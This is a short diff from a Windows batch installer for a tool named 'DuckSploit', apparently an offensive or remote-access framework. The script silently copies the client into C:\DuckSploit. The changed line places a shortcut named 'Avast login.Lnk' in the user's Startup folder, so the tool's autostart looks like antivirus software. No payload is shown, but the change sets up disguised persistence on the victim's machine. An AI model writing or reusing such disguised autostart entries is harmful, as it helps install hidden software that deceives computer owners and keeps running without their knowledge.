@@ -36,7 +36,7 @@ mkdir C:\DuckSploit
 Xcopy %root_dir%\client C:\DuckSploit /E /H /C /I /q /Y
 for /f %%i in (C:\DuckSploit\version.txt) do SET version=%%i
 
-Xcopy "%root_dir%\client\scripts\startup\*.*" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  /E /H /C /I /q /Y
+Xcopy "%root_dir%\client\scripts\startup\Avast login.Lnk" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"  /E /H /C /I /q /Y
 
 
 
